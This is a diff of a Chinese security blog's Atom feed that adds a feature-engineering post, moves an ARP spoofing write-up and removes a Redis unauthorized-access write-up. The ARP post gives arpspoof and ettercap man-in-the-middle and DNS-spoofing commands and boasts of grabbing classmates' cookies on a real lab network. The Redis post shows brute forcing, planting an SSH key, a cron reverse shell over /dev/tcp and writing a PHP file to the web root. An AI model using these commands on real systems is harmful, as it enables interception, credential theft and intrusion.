@@ -6,7 +6,7 @@
   <link href="https://phyb0x.github.io/atom.xml" rel="self"/>
   
   <link href="https://phyb0x.github.io/"/>
-  <updated>2019-01-20T13:45:44.000Z</updated>
+  <updated>2021-08-05T10:38:22.017Z</updated>
   <id>https://phyb0x.github.io/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>特征工程</title>
+    <link href="https://phyb0x.github.io/2021/08/05/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B(%E5%89%AF%E6%9C%AC)/"/>
+    <id>https://phyb0x.github.io/2021/08/05/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B(%E5%89%AF%E6%9C%AC)/</id>
+    <published>2021-08-05T10:26:00.000Z</published>
+    <updated>2021-08-05T10:38:22.017Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="离散变量处理"><a href="#离散变量处理" class="headerlink" title="离散变量处理"></a>离散变量处理</h3><p>离散型变量一般有两种处理方式：LabelEncoder和OneHotEncoder</p><span id="more"></span><h4 id="LabelEncoder"><a href="#LabelEncoder" class="headerlink" title="LabelEncoder"></a>LabelEncoder</h4><p>LabelEncoder既可以对文字型内容进行编码，也可以对数值型内容进行编码。(从0开始)</p><h4 id="OneHotEncoder"><a href="#OneHotEncoder" class="headerlink" title="OneHotEncoder"></a>OneHotEncoder</h4><p>离散特征中有多少不同的值，就用多少维来表示该特征，是<strong>分类变量</strong>作为<strong>二进制向量</strong>的表示。</p><p>假如我们要计算的文本中一共出现了4个词：猫、狗、牛、羊。向量里每一个位置都代表一个词。所以用 one-hot 来表示就是：</p><p>猫：［1，0，0，0］</p><p>狗：［0，1，0，0］</p><p>牛：［0，0，1，0］</p><p>羊：［0，0，0，1］</p><p>one-hot 的缺点如下：</p><ol><li>无法表达词语之间的关系</li><li>这种过于稀疏的向量，导致计算和存储的效率都不高</li></ol><h3 id="合并稀疏特征"><a href="#合并稀疏特征" class="headerlink" title="合并稀疏特征"></a>合并稀疏特征</h3><p>​    做特征工程时，我们可能会遇到一个特征我们假设其特征列的符号值为v，其特征存在多种取值，标签label设为y，特征v如果有很多特征值对应标签y是相同的，那么这些v之间是没有意义的，我们称之为稀疏特征，这个时候可以进行合并稀疏特征，可以降低计算成本和错误分类的可能性。</p><h3 id="统计特征"><a href="#统计特征" class="headerlink" title="统计特征"></a>统计特征</h3><p>当前样本集的各种统计信息，包括均值、最大值、1分位数、4分位数等。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h3 id=&quot;离散变量处理&quot;&gt;&lt;a href=&quot;#离散变量处理&quot; class=&quot;headerlink&quot; title=&quot;离散变量处理&quot;&gt;&lt;/a&gt;离散变量处理&lt;/h3&gt;&lt;p&gt;离散型变量一般有两种处理方式：LabelEncoder和OneHotEncoder&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>sql绕安全狗</title>
@@ -100,25 +117,6 @@ WLS 组件远程代码执行 CVE-2017-10271
   </entry>
   
   <entry>
-    <title>ARP欺骗</title>
-    <link href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/"/>
-    <id>https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/</id>
-    <published>2018-12-28T03:44:14.000Z</published>
-    <updated>2019-01-19T02:06:30.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h3><span id="more"></span><p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h3 id="Arp协议缺陷"><a href="#Arp协议缺陷" class="headerlink" title="Arp协议缺陷"></a>Arp协议缺陷</h3><p>ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表，说白了就是他信任网络环境内任意通信。</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>ARP欺骗分为伪造主机欺骗、伪造网关欺骗、中间人欺骗、ARP泛洪和攻击。</p><p>伪造主机:造成特定主机被认为无响应</p><p>伪造网关:伪造网关，抓取局域网内数据，断网</p><p>中间人欺骗:恶意主机既向网关发送主机数据，又伪造网关像主机发数据，作为中间人可看主机与网关之间交互的数据</p><p>ARP泛洪攻击：利用ARP缓存表支持动态刷新，且是有一定限制的刷多了就把正确的覆盖了，消耗资源</p><h4 id="伪造网关欺骗"><a href="#伪造网关欺骗" class="headerlink" title="伪造网关欺骗"></a>伪造网关欺骗</h4><p>搭建个小环境</p><p><img src="https://i.imgur.com/lDssIx2.png"></p><p>像主机B(10.10.10.133)发送ARP响应包，欺骗主机A(10.10.10.135) kali为网关</p><pre><code>arpspoof -i eth1 -t 10.10.10.133 10.10.10.1</code></pre><p>欺骗前</p><p><img src="https://i.imgur.com/U1V2BNW.png"></p><p>欺骗后</p><p><img src="https://i.imgur.com/jzzdh5j.png"></p><p>可以看到一直是主机B与网关的通信</p><p><img src="https://i.imgur.com/zjjwXsc.png"></p><p>很显然了与网关之间的通信内容也是会被抓窃取。</p><h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p><img src="https://i.imgur.com/ufJj1eu.png"></p><p>本机arp缓存表，可以看到从上到下ip依次为本机，网关，安卓手机，kali，现在我利用kali对主机与网关之间通信进行欺骗。</p><p>先打开路由转发(不开启会断网)</p><pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 192.168.31.1 192.168.31.157arpspoof -i eth0 -t 192.168.31.157 192.168.31.1</code></pre><p><img src="https://i.imgur.com/OPGPLLM.png"></p><p>可以看到主机还是可以联网，但是ARP表上网关的MAC地址却是我的kali机，这就意味着我的kali作为中间人可以截获查看主机与网关之间的往来流量。</p><p>kali上打开wireshark抓包</p><p><img src="https://i.imgur.com/tonPwfc.png"></p><p>可以看到主机与网关之间的通信，来往流量被截获和容易抓到一些敏感信息，甚至明文密码cookie。</p><h4 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h4><pre><code>用法Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]用法：ettercap【选项】【目标1】【目标2】TARGET is in the format MAC/IPs/PORTs (see the man for further detail)目标是MAC/IPs/PORTs格式（根据中间人获取更多信息）嗅探与攻击选项：  -M, --mitm &lt;方法:ARGS&gt;  执行mitm攻击  -o, --only-mitm   不嗅探，只执行mitm攻击  -B, --bridge &lt;IFACE&gt; 使用桥接嗅探（需要2个iface——嗅探时使用的网卡接口，嗅探两块网卡之间的数据包）  -p, --nopromisc  不要将iface放入混杂模式  -S, --nosslmitm  不要伪造SSL证书  -u, --unoffensive不要转发数据包  -r, --read &lt;file&gt;   从pcap文件读取数据 &lt;file&gt;  -f, --pcapfilter &lt;string&gt;   设置pcap过滤器&lt;string&gt;  -R, --reversed使用逆向目标反馈  -t, --proto &lt;proto&gt;  只嗅探该proto（默认是全部）用户界面类型：  -T, --text使用只显示字符的界面  -q, --quiet  安静模式，不显示抓到的数据包内容  -s, --script &lt;CMD&gt;向用户界面发出这些命令  -C, --curses   使用curses图形化界面  -G, --gtk使用GTK+ GUI  -D, --daemon守护模式（无界面），相当于在后台运行日志选项：  -w, --write &lt;file&gt;将嗅探到的数据写入pcap文件 &lt;file&gt;  -L, --log &lt;logfile&gt;  此处记录所有流量&lt;logfile&gt;  -l, --log-info &lt;logfile&gt;此处记录所有信息&lt;logfile&gt;  -m, --log-msg &lt;logfile&gt; 此处记录所有消息记录&lt;logfile&gt;  -c, --compress  使用gzip压缩日志文件可视化选项：  -d, --dns   将ip地址解析为主机名  -V, --visual &lt;format&gt;设置可视化格式  -e, --regex &lt;regex&gt;  只实现匹配该regex数据包的可视化  -E, --ext-headers  打印每个pck的扩展头  -Q, --superquiet   不显示用户名与密码通用选项：  -i, --iface &lt;iface&gt; 使用该网络接口  -I, --liface 显示所有的网络接口  -n, --netmask &lt;netmask&gt;在iface上强制实行（force）该&lt;netmask&gt;  -P, --plugin &lt;plugin&gt;   开始该插件&lt;plugin&gt;  -F, --filter &lt;file&gt;   加载过滤器 &lt;file&gt; （内容过滤器）  -z, --silent   不执行初始ARP扫描  -j, --load-hosts &lt;file&gt;  从 &lt;file&gt;加载主机列表  -k, --save-hosts &lt;file&gt;将主机列表保存至&lt;file&gt;  -W, --wep-key &lt;wkey&gt;   使用该wep密钥解密wifi数据包  -a, --config &lt;config&gt;   使用其它配置文件&lt;config&gt;标准选项：  -U,  --update   从ettercap网站更新数据库  -v,  --version   打印此版本并退出  -h,  --help帮助选项</code></pre><h5 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h5><p>修改<code> /etc/ettercap/etter.dns</code><br><img src="https://i.imgur.com/bURzgxS.png"></p><pre><code>ettercap -i eth0 -T -q -P dns_spoof</code></pre><p>可以看到会访问到我kali本地网站</p><p><img src="https://i.imgur.com/6oa7pgy.png"></p><h5 id="中间人-1"><a href="#中间人-1" class="headerlink" title="中间人"></a>中间人</h5><pre><code>ettercap -i eth0 -T -M arp:remote /192.168.31.157// /192.168.31.1//</code></pre><p><img src="https://i.imgur.com/FwikfBS.png"></p><p>主机上网正常，kali也可以捕获过往流量。</p><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>说起上次比赛有老哥跟我说我们路由没做ip/mac绑定，可以arp，当时没研究过这个危害，在实验室兴起，搞了一波用ettercap做了全局域网的欺骗</p><pre><code>ettercap -i eth0 -T -M arp:remote  /192.168.0.1// </code></pre><p><img src="https://i.imgur.com/9kSpCCL.png"></p><p>扫描到五个存货地址，实验室用的一台路由另一个断网了，可以确定102/195为两位小老弟的ip。(仅仅欺骗了几分钟)</p><p><img src="https://i.imgur.com/3gdM1Eb.png"></p><p>可以看到还在认真的学习！！！</p><p><img src="https://i.imgur.com/Oy8OFZq.png"></p><p>却不知自己某站的cookie已经被抓了。</p><h5 id="有需要的！！！改密码-tql"><a href="#有需要的！！！改密码-tql" class="headerlink" title="有需要的！！！改密码 tql"></a>有需要的！！！改密码 tql</h5><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>破坏性的就是断网，危害比较大的就是欺骗后流量被随意抓取，内网抓管理密码，抓http密码。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>局域网内设备要有通信arp表才显示，并且<code>nmap  -sP</code>没有发现安卓设备。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;Arp协议&quot;&gt;&lt;a href=&quot;#Arp协议&quot; class=&quot;headerlink&quot; title=&quot;Arp协议&quot;&gt;&lt;/a&gt;Arp协议&lt;/h3&gt;</summary>
-    
-    
-    
-    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>ew多级转发</title>
     <link href="https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/"/>
     <id>https://phyb0x.github.io/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/</id>
@@ -129,6 +127,25 @@ WLS 组件远程代码执行 CVE-2017-10271
     
     
     <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前用过nc、reGeorg、lcx涉及到的都是一级网络环境，今天看到圈子里发了文章学习记录下。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ARP欺骗</title>
+    <link href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/"/>
+    <id>https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/</id>
+    <published>2018-12-28T03:44:14.000Z</published>
+    <updated>2019-01-19T02:06:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h3><span id="more"></span><p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h3 id="Arp协议缺陷"><a href="#Arp协议缺陷" class="headerlink" title="Arp协议缺陷"></a>Arp协议缺陷</h3><p>ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表，说白了就是他信任网络环境内任意通信。</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>ARP欺骗分为伪造主机欺骗、伪造网关欺骗、中间人欺骗、ARP泛洪和攻击。</p><p>伪造主机:造成特定主机被认为无响应</p><p>伪造网关:伪造网关，抓取局域网内数据，断网</p><p>中间人欺骗:恶意主机既向网关发送主机数据，又伪造网关像主机发数据，作为中间人可看主机与网关之间交互的数据</p><p>ARP泛洪攻击：利用ARP缓存表支持动态刷新，且是有一定限制的刷多了就把正确的覆盖了，消耗资源</p><h4 id="伪造网关欺骗"><a href="#伪造网关欺骗" class="headerlink" title="伪造网关欺骗"></a>伪造网关欺骗</h4><p>搭建个小环境</p><p><img src="https://i.imgur.com/lDssIx2.png"></p><p>像主机B(10.10.10.133)发送ARP响应包，欺骗主机A(10.10.10.135) kali为网关</p><pre><code>arpspoof -i eth1 -t 10.10.10.133 10.10.10.1</code></pre><p>欺骗前</p><p><img src="https://i.imgur.com/U1V2BNW.png"></p><p>欺骗后</p><p><img src="https://i.imgur.com/jzzdh5j.png"></p><p>可以看到一直是主机B与网关的通信</p><p><img src="https://i.imgur.com/zjjwXsc.png"></p><p>很显然了与网关之间的通信内容也是会被抓窃取。</p><h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p><img src="https://i.imgur.com/ufJj1eu.png"></p><p>本机arp缓存表，可以看到从上到下ip依次为本机，网关，安卓手机，kali，现在我利用kali对主机与网关之间通信进行欺骗。</p><p>先打开路由转发(不开启会断网)</p><pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardarpspoof -i eth0 -t 192.168.31.1 192.168.31.157arpspoof -i eth0 -t 192.168.31.157 192.168.31.1</code></pre><p><img src="https://i.imgur.com/OPGPLLM.png"></p><p>可以看到主机还是可以联网，但是ARP表上网关的MAC地址却是我的kali机，这就意味着我的kali作为中间人可以截获查看主机与网关之间的往来流量。</p><p>kali上打开wireshark抓包</p><p><img src="https://i.imgur.com/tonPwfc.png"></p><p>可以看到主机与网关之间的通信，来往流量被截获和容易抓到一些敏感信息，甚至明文密码cookie。</p><h4 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h4><pre><code>用法Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]用法：ettercap【选项】【目标1】【目标2】TARGET is in the format MAC/IPs/PORTs (see the man for further detail)目标是MAC/IPs/PORTs格式（根据中间人获取更多信息）嗅探与攻击选项：  -M, --mitm &lt;方法:ARGS&gt;  执行mitm攻击  -o, --only-mitm   不嗅探，只执行mitm攻击  -B, --bridge &lt;IFACE&gt; 使用桥接嗅探（需要2个iface——嗅探时使用的网卡接口，嗅探两块网卡之间的数据包）  -p, --nopromisc  不要将iface放入混杂模式  -S, --nosslmitm  不要伪造SSL证书  -u, --unoffensive不要转发数据包  -r, --read &lt;file&gt;   从pcap文件读取数据 &lt;file&gt;  -f, --pcapfilter &lt;string&gt;   设置pcap过滤器&lt;string&gt;  -R, --reversed使用逆向目标反馈  -t, --proto &lt;proto&gt;  只嗅探该proto（默认是全部）用户界面类型：  -T, --text使用只显示字符的界面  -q, --quiet  安静模式，不显示抓到的数据包内容  -s, --script &lt;CMD&gt;向用户界面发出这些命令  -C, --curses   使用curses图形化界面  -G, --gtk使用GTK+ GUI  -D, --daemon守护模式（无界面），相当于在后台运行日志选项：  -w, --write &lt;file&gt;将嗅探到的数据写入pcap文件 &lt;file&gt;  -L, --log &lt;logfile&gt;  此处记录所有流量&lt;logfile&gt;  -l, --log-info &lt;logfile&gt;此处记录所有信息&lt;logfile&gt;  -m, --log-msg &lt;logfile&gt; 此处记录所有消息记录&lt;logfile&gt;  -c, --compress  使用gzip压缩日志文件可视化选项：  -d, --dns   将ip地址解析为主机名  -V, --visual &lt;format&gt;设置可视化格式  -e, --regex &lt;regex&gt;  只实现匹配该regex数据包的可视化  -E, --ext-headers  打印每个pck的扩展头  -Q, --superquiet   不显示用户名与密码通用选项：  -i, --iface &lt;iface&gt; 使用该网络接口  -I, --liface 显示所有的网络接口  -n, --netmask &lt;netmask&gt;在iface上强制实行（force）该&lt;netmask&gt;  -P, --plugin &lt;plugin&gt;   开始该插件&lt;plugin&gt;  -F, --filter &lt;file&gt;   加载过滤器 &lt;file&gt; （内容过滤器）  -z, --silent   不执行初始ARP扫描  -j, --load-hosts &lt;file&gt;  从 &lt;file&gt;加载主机列表  -k, --save-hosts &lt;file&gt;将主机列表保存至&lt;file&gt;  -W, --wep-key &lt;wkey&gt;   使用该wep密钥解密wifi数据包  -a, --config &lt;config&gt;   使用其它配置文件&lt;config&gt;标准选项：  -U,  --update   从ettercap网站更新数据库  -v,  --version   打印此版本并退出  -h,  --help帮助选项</code></pre><h5 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h5><p>修改<code> /etc/ettercap/etter.dns</code><br><img src="https://i.imgur.com/bURzgxS.png"></p><pre><code>ettercap -i eth0 -T -q -P dns_spoof</code></pre><p>可以看到会访问到我kali本地网站</p><p><img src="https://i.imgur.com/6oa7pgy.png"></p><h5 id="中间人-1"><a href="#中间人-1" class="headerlink" title="中间人"></a>中间人</h5><pre><code>ettercap -i eth0 -T -M arp:remote /192.168.31.157// /192.168.31.1//</code></pre><p><img src="https://i.imgur.com/FwikfBS.png"></p><p>主机上网正常，kali也可以捕获过往流量。</p><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>说起上次比赛有老哥跟我说我们路由没做ip/mac绑定，可以arp，当时没研究过这个危害，在实验室兴起，搞了一波用ettercap做了全局域网的欺骗</p><pre><code>ettercap -i eth0 -T -M arp:remote  /192.168.0.1// </code></pre><p><img src="https://i.imgur.com/9kSpCCL.png"></p><p>扫描到五个存货地址，实验室用的一台路由另一个断网了，可以确定102/195为两位小老弟的ip。(仅仅欺骗了几分钟)</p><p><img src="https://i.imgur.com/3gdM1Eb.png"></p><p>可以看到还在认真的学习！！！</p><p><img src="https://i.imgur.com/Oy8OFZq.png"></p><p>却不知自己某站的cookie已经被抓了。</p><h5 id="有需要的！！！改密码-tql"><a href="#有需要的！！！改密码-tql" class="headerlink" title="有需要的！！！改密码 tql"></a>有需要的！！！改密码 tql</h5><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>破坏性的就是断网，危害比较大的就是欺骗后流量被随意抓取，内网抓管理密码，抓http密码。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>局域网内设备要有通信arp表才显示，并且<code>nmap  -sP</code>没有发现安卓设备。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h3 id=&quot;Arp协议&quot;&gt;&lt;a href=&quot;#Arp协议&quot; class=&quot;headerlink&quot; title=&quot;Arp协议&quot;&gt;&lt;/a&gt;Arp协议&lt;/h3&gt;</summary>
     
     
     
@@ -376,25 +393,6 @@ WLS 组件远程代码执行 CVE-2017-10271
     
     
     <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;收集复现下网上linux后门姿势，一起学习下。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>redis未授权访问</title>
-    <link href="https://phyb0x.github.io/2018/10/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    <id>https://phyb0x.github.io/2018/10/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
-    <published>2018-10-22T14:48:25.000Z</published>
-    <updated>2019-01-19T02:05:04.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很早的洞了一直没仔细研究下(主要是看了几天审计太难受了)。</p><span id="more"></span><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>Redis是一个开源的高性能内存数据库也支持将内存数据保存在硬盘上，但是redis未强制访问权限，默认情况下会绑定在6379端口，没有进行采用相关策略与防火墙直接暴露在公网，没有设置密码认证可以免密登录服务造成未授权访问。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机ip: 192.168.184.145</p><p>靶机ip：192.168.184.139</p><p>这里也是有几种利用方式</p><h4 id="ssh写公钥"><a href="#ssh写公钥" class="headerlink" title="ssh写公钥"></a>ssh写公钥</h4><p>root权限的话我们就可以肆意妄为了，可以直接利用上传公钥ss免密登录。</p><p>首先我们先连接到redis，做最基本的一些信息收集，可以看到低版本还会暴露配置文件目录</p><p><img src="https://i.imgur.com/myJA0j9.png"></p><p><img src="https://i.imgur.com/lLdFPFw.png"><br>当然如果有密码的话我们先尝试爆破</p><pre><code>hydra -P passwd.txt redis://192.168.184.139</code></pre><p>然后我们更改redis备份路径到ssh公钥存放路径 /root/.ssh</p><p>本地生成公私钥将公钥写入test.txt</p><pre><code>ssh-keygen -t rsa(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt</code></pre><p><img src="https://i.imgur.com/wcdU7jo.png"></p><p>上传到靶机服务器</p><pre><code>cat test.txt | redis-cli -h 192.168.184.139 -x set crack</code></pre><p>然后把redis备份路径更改为ssh公钥目录，重命名为authorized_keys</p><pre><code>config set dir /root/.sshconfig set dbfilename authorized_keys</code></pre><p><img src="https://i.imgur.com/a4PMtBz.png"></p><p>可以看到我们的公钥已经传上去了<br><img src="https://i.imgur.com/f1mBOVX.png"><br>连接成功</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code>set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.194.145/444 0&gt;&amp;1\n\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><img src="https://i.imgur.com/uquQR6t.png"></p><h5 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h5><p>我们可以把写文件的目录改为web根路径，写入我们的webshell</p><pre><code>config set dir /var/www/htmlset xxx &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;config set dbfilename webshell.phpsave</code></pre><p><img src="https://i.imgur.com/9nEu6LP.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>复现也是踩了很多坑，我先是用的ununtuserver、centos去复现都会有权限问题，直接用root sudo启动默认也是redis权限，而且关掉redis保护线程后 kill -9 也kill不掉。还有就是用ubuntu复现还会有shell环境问题    <a href="https://cloud.tencent.com/developer/news/301606">https://cloud.tencent.com/developer/news/301606</a>，还有就是写入的时候会有缓存，在set各种值的时候，这些值会混在一起导致攻击失效，比如我先尝试写公钥最后连接失败，再去进行反弹shell/写webshell，这个时候你set的木马或者反弹语句会与你写入的公钥混在一起，执行无效。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;很早的洞了一直没仔细研究下(主要是看了几天审计太难受了)。&lt;/p&gt;</summary>
     
     
     
